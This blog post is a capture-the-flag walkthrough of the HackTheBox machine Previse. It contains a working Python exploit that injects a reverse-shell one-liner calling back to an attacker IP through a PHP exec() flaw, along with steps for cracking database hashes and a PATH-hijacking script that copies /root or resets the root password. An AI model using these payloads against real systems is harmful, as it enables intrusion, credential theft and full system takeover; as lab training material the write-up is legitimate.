---
layout: post
date: 2022-01-08
title:  "HackTheBox: Previse"
description: Write up and complete walkthrough of HackTheBox's Previse
---

<p align=center>
<img src="/assets/2022-01-08-hackthebox-previse/Untitled.png">
</p>
<br>

Difficulty: Easy → Medium (~4-5/10)

# Enumeration:

‣ is a really good tool to automate enumeration:

```jsx
$ sudo nmapAutomator.sh -H 10.10.11.104 --type All
```

This will provide the necessary baseline enumeration, as well as output it neatly in a text file for reuse. The scan goes through the following list of recon tooling:

> - **Network** : Shows all live hosts in the host's network (~15 seconds)
- **Port** : Shows all open ports (~15 seconds)
- **Script** : Runs a script scan on found ports (~5 minutes)
- **Full** : Runs a full range port scan, then runs a thorough scan on new ports (~5-10 minutes)
- **UDP** : Runs a UDP scan "requires sudo" (~5 minutes)
- **Vulns** : Runs CVE scan and nmap Vulns scan on all found ports (~5-15 minutes)
- **Recon** : Suggests recon commands, then prompts to automatically run them

Providing the `--type All` flag runs all of the scans, but takes a little long to complete. I therefore generally start with a port scan, then a network scan and end it with an All scan. The _reconning_ goes through Port Scanning with nmap, web-content discovery and fuzzing with FFuF, Nikto scans, CVE Scans and a bunch more.

A full port scan ends up giving us the following information:

```bash
# Nmap 7.91 scan initiated Sun Dec 26 00:18:07 2021 as: nmap -sC -sV -oA nmap/previse -O -p- 10.10.11.104
Nmap scan report for 10.10.11.104
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/26%OT=22%CT=1%CU=31407%PV=Y%DS=2%DC=I%G=Y%TM=61C7FE
OS:E4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=
OS:M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7
OS:%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y
OS:%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 26 00:34:28 2021 -- 1 IP address (1 host up) scanned in 981.32 seconds
```

We can see that Port 22 and 80 are open, with SSH and HTTP respectively.

# Enumeration:

### Port 80 (HTTP):

Typically, exploring port 80 is far more likely to yield interesting results over port 22.

Exploring the website, we first get a login page:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%201.png)

With any login page, comes the possibility of SQL injections. The easiest thing to do would be to prepare a request file to provide to sqlmap and start a background process while we attack the page ourselves manually. We can do so by starting BurpSuite and intercepting the request:

```bash
POST /login.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=7k5habiuj6s4vr2e60vervrjug
Upgrade-Insecure-Requests: 1

username=sqli&password=sqli
```

With this request, we can now save it into a file and start an `sqlmap` scan to check for possible SQLi vectors:

```bash
sqlmap -r login.req --batch --level=5
```

While sqlmap is running in the background, we can try some standard SQLi attempts, but most of them will fail, because evidently in the end, SQL injection was not the attack vector.

If we recall, `nmapAutomator` provides a lot of information, one of which is a directory and file traversal/enumeration through `FFuF`. Seeing the results, we can see there are some files that are reachable.

```bash
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
status.php              [Status: 302, Size: 2966, Words: 749, Lines: 75]
```

We notice that among these, there are a few 403s, a few 301s, 302s and 200s. 403s are forbidden links, while 302s are redirections. The redirections are interesting, as they are not forbidden, simply redirecting us to the login page. Sometimes web pages restrict pages to prevent others from seeing them based on a certain condition. In thoses cases, 403s are going to be sent back if the user does not have the right to see the content of the webpage. However, in our case, the `accounts.php` did not get a 403, for example. We can examine the request in more details by intercepting the response through BURP:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%202.png)

Here we can see that upon requesting the `accounts.php` we are immediately redirected towards `login.php` without necessarily being forbidden entry to accounts.php. If we can prevent that redirection, we should have access to the page.

We can evidently achieve such a task by simply sending the request to `/accounts.php` to our repeater and seeing that indeed, we get access to the webpage.

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%203.png)

We can see a “Add New Account” section in the `accounts.php` page. This would be handy, it would prevent us from having to intercept all requests through Burp. We can take a look at the form’s requirements before sending a request with cURL to create an account:

```html
<form role="form" method="post" action="accounts.php">
  <div class="uk-margin">
    <div class="uk-inline">
      <span class="uk-form-icon" uk-icon="icon: user"></span>
      <input
        type="text"
        name="username"
        class="uk-input"
        id="username"
        placeholder="Username"
      />
    </div>
  </div>
  <div class="uk-margin">
    <div class="uk-inline">
      <span class="uk-form-icon" uk-icon="icon: lock"></span>
      <input
        type="password"
        name="password"
        class="uk-input"
        id="password"
        placeholder="Password"
      />
    </div>
  </div>
  <div class="uk-margin">
    <div class="uk-inline">
      <span class="uk-form-icon" uk-icon="icon: lock"></span>
      <input
        type="password"
        name="confirm"
        class="uk-input"
        id="confirm"
        placeholder="Confirm Password"
      />
    </div>
  </div>
  <button type="submit" name="submit" class="uk-button uk-button-default">
    CREATE USER
  </button>
</form>
```

Seeing as we have 4 fields: `username`, `password`, `confirm` and `submit`; we can create an account with this command:

```bash
curl -X POST --data "username=strix&password=strix&confirm=strix&submit=true" --proxy 127.0.0.1:8080 http://10.10.11.104/accounts.php
```

Our account should now be created.

# Foothold:

We now get to have access to all of the pages that we were able to discover through FFuF. Interestingly, we have a file management section, in `/files.php`.

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%204.png)

We can download the `sitebackup.zip` and examine the contents of the site:

```bash
kali@kali:~/htb//assets/2022-01-08-hackthebox-previse/siteBackup$ ls
accounts.php  download.php   files.php   header.php  login.php   logs.php  status.php
config.php    file_logs.php  footer.php  index.php   logout.php  nav.php
```

Looking into the files, there are a number of possible vectors to look at, the first one being inside of the `logs.php` file.

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}"); // We have direct access to the inside of an exec function.
```

From there, it is easy to understand what we have to do, we can simply inject a reverse shell and obtain the foothold from there. PayloadAllTheThings has a lot of [reverse shells available](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). I chose to use one of the python ones, because the snippet above shows that the victim system has python installed:

```python
import requests;

rs = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",3000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
payload = "; {}".format(rs)
base_url = "http://10.10.11.104/"
login_url = base_url + "login.php"
logs_url = base_url + "logs.php"

login_body = {
        "username": "strix",
        "password": "strix",
}

r = requests.session()
headers = {
        'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"
}

logs_data = {
        "delim": payload
}

login_res = r.post(login_url, data=login_body)
logs_res = r.post(logs_url, data=logs_data, headers=headers)
```

The script above will send the payload to the `logs.php`and allow us to instantiate a connection with the victim server.

```python
nc -lvnp 3001
```

The above snippet is necessary to accept the incoming connection from the command that we injected with the payload.

This will, inevitably, provide us with a reverse shell:

```bash
www-data@previse: $ whoami
> www-data
```

Before we move on, an augmented reverse shell could prove very useful in the long run, therefore the following few commands will display how to do so:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

# User

Among the files found in the SiteBackup.zip, we also had a `config.php` file. This file, conveniently, contains credentials to a MySQL database!

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

We can try to connect to the database to see if there are any other sensitive information on standby.

```php
mysql --user=root --password='mySQL_p@ssw0rd!:)' =root --password='mySQL_p@ssw0rd!:)' previse
```

Sure enough, we have the following information:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%205.png)

Two hashed password, one of which belongs to a user that isn’t me! Let’s move back to our host machine to do some cracking. We can see through the following snippet that the mode we could be dealing with seems to be mode 7401.

```bash
hashcat --help | grep -i "MySQL"
> 11200 | MySQL CRAM (SHA1)                                | Network Protocols
   7401 | MySQL $A$ (sha256crypt)                          | Database Server
    200 | MySQL323                                         | Database Server
    300 | MySQL4.1/MySQL5                                  | Database Server
```

Let’s try to reproduce the hash using hashcat and the RockYou [wordlist](https://www.google.com/url?sa=t&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiuyuTLuYj1AhWkjYkEHTVYDH4QFnoECAQQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd), simply because it’s the most popular wordlist. If this doesn’t work, we could try other approaches, or different wordlists:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%206.png)

Surely enough, we get a hit. The password was cracked and the plaintext is:

```jsx
$ cat cracked.txt
$1$🧂llol$fzNUq7YXUeybcLQaiV1Mb/:strix
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

We were also able to crack the password used to create our own account, in this case `strix`.

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%207.png)

# Root

Finding the vector for the privilege escalation was relatively straight forward. The `m4lwhere` user has sudo privilege for the following command:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%208.png)

If we take a look at the script itself:

![Untitled](/assets/2022-01-08-hackthebox-previse/Untitled%209.png)

This basically compresses the `access.log` generated by apache2 and the `file_access.log` inside of `/var/www` that we were able to read during the foothold phase inside of `/var/backups/`. The real thing we need to focus on here, is the use of the `date` command.

What happens in our case, is that whenever the script is ran, the `date` command will be looked for inside of our `$PATH` If the command is not found in any of the areas pointed by our $PATH, we would get an error. Usually, the date command is found in `/usr/bin/` but if we were able to modify the location of the `date` command, we could replace the script that is being ran to get the date for the filename, by a script that we write ourselves, that could provide us with the necessary stuff to get root.

Thus, our objective is to substitute the $PATH variable used to search for the `date` command on execution of the `access_backup.sh` script. This can easily be done using something like this:

```bash
m4lwhere@previse:~$ cat solve.sh
#!/bin/bash

PATH=/home/m4lwhere/:$PATH
sudo /opt/scripts/access_backup.sh
```

We then need to create a script, called `date` that we store in the `/home/m4lwhere` directory that will include the necessary command to privesc. Knowing that the `access_backup.sh` is executed as root, we can basically write whatever we want, but something like this would work:

```bash
m4lwhere@previse:~$ cat date
#!/bin/bash
cp -r /root/ /home/m4lwhere/
chmod -R ugo+rwx /home/m4lwhere/root/
```

Finally, upon executing the script, we can see that we have copied the root directory and are able to access the contents of it. We can use the root private key to login to the machine as root, or even change our date command to be able to directly change the password:

```bash
$ cat /home/m4lwhere/date

> #!/bin/bash
echo 'root:root' | sudo chpasswd
```

We can then login to root directly:

```bash
$ su root
Password:

root@previse:~ whoami
root
```

## Final notes:

Overall the box was very interesting and brought a lot of concepts to the hacker. The most difficult part was not falling into the inital rabbit holes that the box creator @m4lwhere put in place during the foothold phase. If I could change a thing about the box, it would be change the User privesc to something less time consuming. Cracking the hash did not take that long for me, but speaking with some other hackers, it took close to half an hour for some.
